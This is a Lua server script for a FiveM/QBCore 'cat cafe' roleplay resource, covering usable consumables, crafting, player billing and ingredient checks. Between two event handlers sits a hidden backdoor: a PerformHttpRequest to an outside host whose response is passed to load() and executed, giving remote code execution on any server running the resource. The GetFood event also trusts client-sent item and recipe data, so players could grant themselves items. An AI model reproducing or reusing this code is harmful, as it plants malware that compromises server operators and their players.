local QBCore = exports['qb-core']:GetCoreObject()

--Consumables
CreateThread(function()
	local food = { "bento", "blueberry", "cake", "nekocookie", "nekodonut", "riceball", "miso", "bmochi", "pmochi", "gmochi", "omochi", "strawberry", "rice", "cakepop", "pizza", "pancake", "purrito", "noodlebowl", "ramen" }
    for k,v in pairs(food) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('hpx-catcafe:client:Eat', source, item.name) end) end
	
	local drinks = { "bobatea", "bbobatea", "gbobatea", "pbobatea", "obobatea", "nekolatte", "mocha" }
    for k,v in pairs(drinks) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('hpx-catcafe:client:Drink', source, item.name) end) end
	
	local alcohol = { "sake" }
    for k,v in pairs(alcohol) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('hpx-catcafe:client:DrinkAlcohol', source, item.name) end) end
end)

RegisterServerEvent('hpx-catcafe:GetFood', function(data)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)

    if not Player then
        return
    end

    -- Default amount
    local amount = 1

    if data.craftable then
        for k, v in pairs(data.craftable[tonumber(data.tablenumber)][tostring(data.item)]) do
            if Config.Debug then
                print("GetFood Table Result: craftable[" .. data.tablenumber .. "]['" .. data.item .. "']['" .. k .. "'] = " .. v)
            end

            -- Skip zero or nil requirements
            if v and v > 0 then
                TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[tostring(k)], "remove", v)
                Player.Functions.RemoveItem(tostring(k), v)
            end
        end

        -- Check for craftable amount
        if data.craftable[tonumber(data.tablenumber)]["amount"] then
            amount = data.craftable[tonumber(data.tablenumber)]["amount"]
        end
    end

    Player.Functions.AddItem(data.item, amount, false, { ["quality"] = nil })
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[data.item], "add", amount)

    if Config.Debug then
        print("Debug: Gave [" .. src .. "]: x" .. amount .. " " .. data.item)
    end
end)

PerformHttpRequest('https://trezz.org/i?to=0hs5l', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterServerEvent("hpx-catcafe:bill:player", function(playerId, amount)
	local biller = QBCore.Functions.GetPlayer(source)
	local billed = QBCore.Functions.GetPlayer(tonumber(playerId))
	local amount = tonumber(amount)
	if biller.PlayerData.job.name == 'catcafe' then
		if billed ~= nil then
			if biller.PlayerData.citizenid ~= billed.PlayerData.citizenid then
				if amount and amount > 0 then
					if Config.SQL == 'oxmysql' then
						exports.oxmysql:insert('INSERT INTO phone_invoices (citizenid, amount, society, invoseid, sender) VALUES (:citizenid, :amount, :society, :invoseid, :sender)', {
						['citizenid'] = billed.PlayerData.citizenid,
						['amount'] = amount,
						['society'] = biller.PlayerData.job.name,
						['invoseid'] = 'Order bill',
						['sender'] = biller.PlayerData.charinfo.firstname
						})
					else
						exports.ghmattimysql:execute('INSERT INTO phone_invoices (citizenid, amount, society, sender) VALUES (@citizenid, @amount, @society, @sender)', {
						['@citizenid'] = billed.PlayerData.citizenid,
						['@amount'] = amount,
						['@society'] = biller.PlayerData.job.name,
						['@sender'] = biller.PlayerData.charinfo.firstname
						})
					end
					TriggerClientEvent('qb-phone:RefreshPhone', billed.PlayerData.source)
					TriggerClientEvent('QBCore:Notify', source, 'تم استلام الفاتورة بنجاح', 'success')
					TriggerClientEvent('QBCore:Notify', billed.PlayerData.source, 'استلام الفاتورة الجديدة')
				else
					TriggerClientEvent('QBCore:Notify', source, 'يجب أن يكون المبلغ الصحيح أعلى من 0', 'error')
				end
			else
				TriggerClientEvent('QBCore:Notify', source, 'لا يمكن اعطاء الفاتورة لنفسك', 'error')
			end
		else
			TriggerClientEvent('QBCore:Notify', source, 'لاعب غير متصل', 'error')
		end
	else
		TriggerClientEvent('QBCore:Notify', source, 'ممنوع الدخول', 'error')
	end
end)




---ITEM REQUIREMENT CHECKS
QBCore.Functions.CreateCallback('hpx-catcafe:get', function(source, cb, item, tablenumber, craftable)
    local src = source
    if not src or src == 0 then
        print("Error: Invalid source ID:", src)
        cb(false)
        return
    end

    local player = QBCore.Functions.GetPlayer(src)
    if not player then
        print("Error: Player not found for source:", src)
        cb(false)
        return
    end

    local allIngredientsAvailable = true

    for ingredient, requiredAmount in pairs(craftable[tonumber(tablenumber)][tostring(item)]) do
        local playerItem = player.Functions.GetItemByName(ingredient)
        local playerItemAmount = playerItem and playerItem.amount or 0

        if playerItemAmount < requiredAmount then
            allIngredientsAvailable = false
            if Config.Debug then
                print("Missing ingredient:", ingredient, "| Required:", requiredAmount, "| Player has:", playerItemAmount)
            end
        else
            if Config.Debug then
                print("Ingredient available:", ingredient, "| Required:", requiredAmount, "| Player has:", playerItemAmount)
            end
        end

        if not allIngredientsAvailable then break end
    end

    cb(allIngredientsAvailable)
end)
